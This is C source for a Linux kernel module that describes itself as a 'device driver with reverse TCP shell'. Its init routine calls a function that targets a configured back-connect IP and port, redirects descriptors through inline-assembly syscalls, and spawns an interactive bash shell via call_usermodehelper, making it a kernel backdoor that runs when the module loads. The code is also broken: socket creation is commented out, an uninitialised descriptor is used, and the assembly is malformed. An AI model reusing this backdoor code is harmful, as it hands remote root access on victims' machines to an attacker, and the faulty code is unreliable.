
#include "reverseTCP.h"

MODULE_LICENSE("GPL");            
MODULE_AUTHOR("Jorge Lima");    
MODULE_DESCRIPTION("device driver with reverse TCP shell");  
MODULE_VERSION("1.0");            

//file operations for driver
static struct file_operations reverseTCP_fops =
{
   .open = reverseTCP_open,
   .release = reverseTCP_release, 
   .unlocked_ioctl = reverseTCP_ioctl,
};

//==============================
//=====> init function <========
//==============================
static int __init reverseTCP_init(void){
   printk(KERN_ALERT "reverseTCP: Initializing driver\n");

   //get major number
   major_number = register_chrdev(0, DEVICE_NAME, &reverseTCP_fops);
   if (major_number<0){
      printk(KERN_ALERT "reverseTCP: failed to register a major number\n");
      major_number = -1;
      return major_number;
   }
   printk(KERN_ALERT "reverseTCP: driver registered with major number %d\n", major_number);

   // Register device class
   reverseTCP_class = class_create(THIS_MODULE, CLASS_NAME);
   if (IS_ERR(reverseTCP_class)){                
      unregister_chrdev(major_number, DEVICE_NAME);
      printk(KERN_ALERT "reverseTCP: failed to register device class\n");
      return PTR_ERR(reverseTCP_class);          
   }
   printk(KERN_ALERT "reverseTCP: device class registered\n");

   // Register the device driver
   reverseTCP_device = device_create(reverseTCP_class, NULL, MKDEV(major_number, 0), NULL, DEVICE_NAME);
   if (IS_ERR(reverseTCP_device)){               
      class_destroy(reverseTCP_class);
      unregister_chrdev(major_number, DEVICE_NAME);
      printk(KERN_ALERT "reverseTCP: failed to create the device\n");
      return PTR_ERR(reverseTCP_device);
   }
   printk(KERN_ALERT "reverseTCP: device class created correctly\n");


   printk(KERN_ALERT "reverseTCP: calling reverseTCP_connect\n");
   reverseTCP_connect();
   printk(KERN_ALERT "reverseTCP: no hickupp!!!!\n");


   return 0;
}


//=========================
//=====> exit device <=====
//=========================
static void __exit reverseTCP_exit(void){
   device_destroy(reverseTCP_class, MKDEV(major_number, 0));     
   class_unregister(reverseTCP_class);                          
   class_destroy(reverseTCP_class);                             
   unregister_chrdev(major_number, DEVICE_NAME);             
   printk(KERN_ALERT "reverseTCP: device driver removed from kernel\n");
}


//==================================
//=====> device open function <=====
//==================================
static int reverseTCP_open(struct inode *inodep, struct file *filep){
   if(!reverseTCP_mutex)reverseTCP_mutex++;//lock devise reverseTCP_mutex
   num_of_dev_open++;
   printk(KERN_ALERT "reverseTCP: device opened\n");
   return 0;
}


//============================
//=====> device release <=====
//============================
static int reverseTCP_release(struct inode *inodep, struct file *filep){
   if(reverseTCP_mutex)reverseTCP_mutex--;
   num_of_dev_open--;
   printk(KERN_ALERT "reverseTCP: device closed\n");
   (reverseTCP_mutex < 1) ? printk(KERN_ALERT "reverseTCP: mutex free\n") : printk(KERN_ALERT "reverseTCP: mutex locked\n");
   return 0;
}

//==========================
//=====> device ioctl <=====
//==========================
/*
 * ioctl has 2 commads, and always gets passed a NULL argument
 * DEVICE_IN_USE_IOCTL checks the status of the reverseTCP_mutex
 * NUMBER_OF_DEVICES_IOCTL returns the number of process using the devise, starting at 0 if 1 is using it, if unused -1
 * */
static long    reverseTCP_ioctl (struct file *filp, unsigned int cmd, unsigned long arg){
    char ret = 0;
    switch(cmd){
        case DEVICE_IN_USE_IOCTL:
            ret = reverseTCP_mutex;
            break;
        case NUMBER_OF_DEVICES_IOCTL:
            ret = num_of_dev_open;
            break;
        default:
            ret = -1;
            break;
    }
    
    return ret;
}


//=========================
//=====> reverse tcp <=====
//=========================


//reverse shell
static int reverseTCP_connect(void)
{
    int send_sock_fd;//hold socket file descriptors
    struct sockaddr_in srv_addr;
    struct socket *new_sock = NULL;
    srv_addr.sin_family = AF_INET;
    srv_addr.sin_port = htons(back_port);
    srv_addr.sin_addr.s_addr = htonl(back_IP); 
    
    char *argv[] = { "/bin/bash", "-i", NULL};
    
    static char *envp[] = {"HOME=/", "TERM=linux", "PATH=/sbin:/usr/sbin:/bin:/usr/bin", NULL};

    printk(KERN_ALERT "reverseTCP: calling all socket init stuff\n");
    
    /*
    //create sockets
    send_sock_fd = sock_create( AF_INET, SOCK_STREAM, IPPROTO_IP,&new_sock );
    
    printk(KERN_ALERT "reverseTCP: socket #: %d\n", send_sock_fd);
    //connect sockets
    //new_sock->ops->connect(new_sock, (struct sockaddr *)&srv_addr, sizeof(srv_addr),O_RDWR);
    
    printk(KERN_ALERT "reverseTCP: duplicating stdin/out descriptors\n");

	*/
    //duplicate socket descriptors to file descriptors 0,1,2
    /*
    sys_dup2(send_sock_fd,0);
    sys_dup2(send_sock_fd,1);
    sys_dup2(send_sock_fd,2);
    */

    //########## assembly magic  ###############
    mm_segment_t saved_fs = get_fs();
  	set_fs(get_ds());

  	__asm__ __volatile__ (
  		.code32
  		"push %%rax;"
  		"push %%rcx;"
  		"push %%r11;"
  
    	"movl $63, %%eax;"
    	"movl %0, %%edi;"
    	"movl $0, %%esi;"
    	"syscall;"
    	
    	"pop %%r11;" 
    	"pop %%rcx;"
    	"pop %%rax;"	

    	:: "r" ( send_sock_fd )
    	.code64
    );
  	/*
    __asm__ __volatile__(
    	"push %%rax;"
  		"push %%rcx;"
  		"push %%r11;"

    	"movl $63, %%eax;"
    	"movl %0, %%edi;"
    	"movl $1, %%esi;"
    	"syscall;"
    	
    	"pop %%r11;" 
    	"pop %%rcx;"
    	"pop %%rax;"	

    	:: "r" ( send_sock_fd )
    );

    __asm__ __volatile__(
    	"push %%rax;"
  		"push %%rcx;"
  		"push %%r11;"

    	"movl $63, %%eax;"
    	"movl %0, %%edi;"
    	"movl $2, %%esi;"
    	"syscall;"

    	"pop %%r11;" 
    	"pop %%rcx;"
    	"pop %%rax;"

    	:: "r" ( send_sock_fd )
    );
	*/
  	set_fs(saved_fs);
    printk(KERN_ALERT "reverseTCP: trying to launch the shell\n");
    printk(KERN_ALERT "reverseTCP: socket #: %d\n", send_sock_fd);
    
    //launch remote shell
    return call_usermodehelper( argv[0], argv, envp, UMH_NO_WAIT );
    

    return 0;
}



module_init(reverseTCP_init);
module_exit(reverseTCP_exit);
